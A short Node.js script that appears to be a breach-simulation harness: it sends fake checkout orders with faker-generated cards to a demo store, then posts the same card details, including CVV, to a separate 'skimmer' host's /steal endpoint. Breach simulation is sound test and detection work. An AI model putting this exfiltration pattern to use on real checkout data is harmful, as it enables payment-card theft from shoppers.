/**
 * simulateBreach.js
 * 
 * Simulates N check-outs against your demo store
 * and then “breaches” them by calling your skimmer endpoint.
 * 
 * Usage:
 *   npm install axios faker
 *   node simulateBreach.js
 */

const axios = require('axios');
const faker = require('faker');
// pref­er IPv4 so you don’t hit a non-listening IPv6 address
const dns = require('dns');
if (dns.setDefaultResultOrder) dns.setDefaultResultOrder('ipv4first');

const STORE_BASE    = process.env.STORE_BASE    || 'https://demo.solutionsedge.io';
const SKIMMER_BASE  = process.env.SKIMMER_BASE  || 'https://skimmer.solutionsedge.io';
const ITERATIONS    = parseInt(process.env.ITERATIONS || '200', 10);
const CONCURRENCY   = parseInt(process.env.CONCURRENCY || '5', 10);

async function simulateOnce(i) {
  // Pick a random product & user
  const productId = Math.floor(Math.random() * 100) + 1;
  const price     = (Math.floor(Math.random() * 400) + 50);
  const product   = `Produkt ${productId}`;
  const name      = faker.name.findName();
  const email     = faker.internet.email();
  const card      = faker.finance.creditCardNumber();
  const expiry    = `${String(Math.floor(Math.random()*12)+1).padStart(2,'0')}/${String(faker.date.future().getFullYear()).slice(-2)}`;
  const cvv       = String(Math.floor(Math.random()*900)+100);

  // 1) Simulate checkout API
  await axios.post(`${STORE_BASE}/api/checkout`, {
    product, price, name, email, cardNumber: card, expiry, cvv
  }).catch(err => {
    console.error(`[${i}] Checkout failed:`, err.response?.status || err.message);
  });

  // 2) Simulate skimmer exfiltration
  await axios.post(`${SKIMMER_BASE}/steal`, {
    product, price, name, email, card, expiry, cvv
  }).catch(err => {
    console.error(`[${i}] Skimmer POST failed:`, err.response?.status || err.message);
  });

  process.stdout.write('.');
}

async function run() {
  console.log(`Simulating ${ITERATIONS} checkouts + breaches (${CONCURRENCY} concurrent)…`);
  let inFlight = [];
  for (let i = 1; i <= ITERATIONS; i++) {
    inFlight.push(simulateOnce(i));
    if (inFlight.length >= CONCURRENCY) {
      await Promise.all(inFlight);
      inFlight = [];
    }
  }
  // wait remaining
  await Promise.all(inFlight);
  console.log('\nDone.');
}

run().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});